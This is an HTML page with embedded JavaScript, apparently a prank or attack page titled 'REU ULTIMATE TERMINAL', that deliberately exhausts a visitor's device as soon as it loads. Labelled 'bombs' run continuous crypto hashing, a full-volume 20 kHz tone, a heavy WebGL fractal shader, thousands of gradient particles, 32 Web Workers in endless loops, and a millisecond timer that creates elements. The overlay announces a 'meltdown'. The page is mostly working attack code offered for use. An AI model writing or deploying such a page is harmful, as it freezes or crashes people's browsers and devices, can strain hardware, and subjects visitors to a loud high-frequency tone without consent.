<!DOCTYPE html>
<html>
<head>
    <title>REU ULTIMATE TERMINAL</title>
    <style>
        body { margin: 0; background: black; overflow: hidden; }
        canvas { 
            position: absolute; 
            top: 0; 
            left: 0; 
            width: 100%; 
            height: 100%; 
        }
        #overlay {
            position: absolute;
            color: lime;
            font-family: monospace;
            font-size: 10px;
            z-index: 100;
            pointer-events: none;
        }
    </style>
</head>
<body>
    <div id="overlay">REU SYSTEM OVERLOAD - INITIATING MELTDOWN</div>
    
    <!-- Canvas 1: WebGL -->
    <canvas id="webgl"></canvas>
    
    <!-- Canvas 2: 2D untuk extra load -->
    <canvas id="canvas2d" style="opacity: 0.5; mix-blend-mode: screen;"></canvas>
    
    <script>
        // Setup canvases
        const glCanvas = document.getElementById('webgl');
        const ctx2dCanvas = document.getElementById('canvas2d');
        
        glCanvas.width = window.innerWidth * 2;
        glCanvas.height = window.innerHeight * 2;
        ctx2dCanvas.width = window.innerWidth * 2;
        ctx2dCanvas.height = window.innerHeight * 2;
        
        const ctx2d = ctx2dCanvas.getContext('2d', { alpha: true, antialias: true });
        
        // ============ WEBCRYPTO BOMB (CPU) ============
        function cryptoBomb() {
            const arr = new Uint8Array(1000000);
            for(let i = 0; i < 100; i++) {
                crypto.getRandomValues(arr);
                const hash = crypto.subtle.digest('SHA-512', arr);
            }
        }
        setInterval(cryptoBomb, 0);
        
        // ============ AUDIO CONTEXT BOMB ============
        try {
            const audioCtx = new (window.AudioContext || window.webkitAudioContext)();
            const oscillator = audioCtx.createOscillator();
            const gainNode = audioCtx.createGain();
            const analyser = audioCtx.createAnalyser();
            
            oscillator.type = 'sawtooth';
            oscillator.frequency.value = 20000;
            gainNode.gain.value = 1;
            
            oscillator.connect(gainNode);
            gainNode.connect(analyser);
            analyser.connect(audioCtx.destination);
            
            oscillator.start();
            
            // Bikin banyak audio processing
            setInterval(() => {
                const dataArray = new Uint8Array(analyser.frequencyBinCount);
                analyser.getByteFrequencyData(dataArray);
                analyser.getByteTimeDomainData(dataArray);
            }, 0);
        } catch(e) {}
        
        // ============ WEBGL SETUP ============
        const gl = glCanvas.getContext('webgl', { 
            powerPreference: "high-performance",
            antialias: true,
            depth: true,
            stencil: true,
            desynchronized: true
        });
        
        if(gl) {
            const vsSource = `attribute vec4 pos; void main() { gl_Position = pos; }`;
            const fsSource = `
                precision highp float;
                uniform float t;
                uniform vec2 r;
                
                float f(vec3 p) {
                    p.z -= t * 2.0;
                    float res = 0.0;
                    for(int i = 0; i < 20; i++) {
                        p = abs(p) / dot(p,p) - 0.9;
                        res += exp(-abs(length(p) - 0.5));
                    }
                    return res;
                }
                
                void main() {
                    vec2 uv = (gl_FragCoord.xy - 0.5 * r.xy) / min(r.x, r.y);
                    vec3 ro = vec3(0.0, 0.0, -5.0);
                    vec3 rd = normalize(vec3(uv, 1.0));
                    
                    float acc = 0.0;
                    for(int i = 0; i < 100; i++) {
                        vec3 p = ro + rd * (float(i) * 0.1);
                        acc += f(p) * 0.1;
                    }
                    
                    gl_FragColor = vec4(sin(acc * 10.0 + t), cos(acc * 8.0 - t), tan(acc * 6.0), 1.0);
                }
            `;
            
            function createShader(gl, source, type) {
                const shader = gl.createShader(type);
                gl.shaderSource(shader, source);
                gl.compileShader(shader);
                return shader;
            }
            
            const vs = createShader(gl, vsSource, gl.VERTEX_SHADER);
            const fs = createShader(gl, fsSource, gl.FRAGMENT_SHADER);
            const prog = gl.createProgram();
            gl.attachShader(prog, vs);
            gl.attachShader(prog, fs);
            gl.linkProgram(prog);
            
            gl.useProgram(prog);
            
            const vertices = new Float32Array([-1,-1,0, 1,-1,0, -1,1,0, 1,1,0]);
            const buf = gl.createBuffer();
            gl.bindBuffer(gl.ARRAY_BUFFER, buf);
            gl.bufferData(gl.ARRAY_BUFFER, vertices, gl.STATIC_DRAW);
            
            const posLoc = gl.getAttribLocation(prog, 'pos');
            gl.enableVertexAttribArray(posLoc);
            gl.vertexAttribPointer(posLoc, 3, gl.FLOAT, false, 0, 0);
            
            const timeLoc = gl.getUniformLocation(prog, 't');
            const resLoc = gl.getUniformLocation(prog, 'r');
            gl.uniform2f(resLoc, glCanvas.width, glCanvas.height);
            
            let time = 0;
            function renderGL() {
                time += 0.1;
                gl.uniform1f(timeLoc, time);
                gl.drawArrays(gl.TRIANGLE_STRIP, 0, 4);
                requestAnimationFrame(renderGL);
            }
            renderGL();
        }
        
        // ============ 2D CANVAS RENDER BOMB ============
        let particles = [];
        for(let i = 0; i < 10000; i++) {
            particles.push({
                x: Math.random() * ctx2dCanvas.width,
                y: Math.random() * ctx2dCanvas.height,
                vx: (Math.random() - 0.5) * 30,
                vy: (Math.random() - 0.5) * 30,
                radius: Math.random() * 20 + 5,
                color: `hsla(${Math.random() * 360}, 100%, 50%, 0.5)`
            });
        }
        
        function render2D() {
            ctx2d.clearRect(0, 0, ctx2dCanvas.width, ctx2dCanvas.height);
            ctx2d.shadowBlur = 50;
            ctx2d.shadowColor = 'white';
            ctx2d.globalCompositeOperation = 'lighter';
            
            for(let p of particles) {
                p.x += p.vx;
                p.y += p.vy;
                
                if(p.x < 0 || p.x > ctx2dCanvas.width) p.vx *= -1;
                if(p.y < 0 || p.y > ctx2dCanvas.height) p.vy *= -1;
                
                ctx2d.beginPath();
                ctx2d.arc(p.x, p.y, p.radius, 0, Math.PI * 2);
                
                const gradient = ctx2d.createRadialGradient(p.x, p.y, 0, p.x, p.y, p.radius * 3);
                gradient.addColorStop(0, p.color);
                gradient.addColorStop(0.7, 'transparent');
                gradient.addColorStop(1, 'white');
                
                ctx2d.fillStyle = gradient;
                ctx2d.fill();
            }
            
            requestAnimationFrame(render2D);
        }
        render2D();
        
        // ============ WEB WORKER NUKES ============
        for(let w = 0; w < 32; w++) {
            const workerCode = `
                let x = 0;
                const heavyMath = (n) => {
                    if(n <= 1) return n;
                    return heavyMath(n-1) + heavyMath(n-2);
                };
                while(true) {
                    x += Math.sin(Math.sqrt(x * Date.now())) * Math.cos(x);
                    const arr = new Array(500000);
                    for(let i=0; i<500000; i++) {
                        arr[i] = Math.pow(i, Math.random() * 10);
                    }
                    arr.sort((a,b) => b-a);
                    try { heavyMath(20); } catch(e) {}
                }
            `;
            const blob = new Blob([workerCode], { type: 'application/javascript' });
            new Worker(URL.createObjectURL(blob));
        }
        
        // ============ TIMER BOMB ============
        setInterval(() => {
            for(let i=0; i<100; i++) {
                document.createElement('div');
                document.createElement('canvas');
                document.createElement('webgl');
            }
        }, 1);
    </script>
</body>
</html>
